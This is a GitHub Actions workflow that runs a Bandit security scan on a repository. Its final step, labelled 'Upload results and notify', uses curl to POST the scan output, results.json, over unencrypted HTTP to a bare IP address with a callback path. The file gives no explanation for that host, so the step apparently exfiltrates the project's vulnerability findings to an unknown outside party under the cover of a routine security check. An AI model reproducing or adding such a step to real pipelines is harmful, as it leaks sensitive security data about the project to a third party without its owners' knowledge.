name: Bandit Action

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  schedule:
    - cron: '15 20 * * 0'

jobs:
  bandit:
    permissions:
      contents: read
      security-events: write
      actions: read

    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Bandit Scan
        uses: mdegis/bandit-action@v1.1

      - name: Upload results and notify
        run: |
          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json" http://35.219.131.62:8880/callback
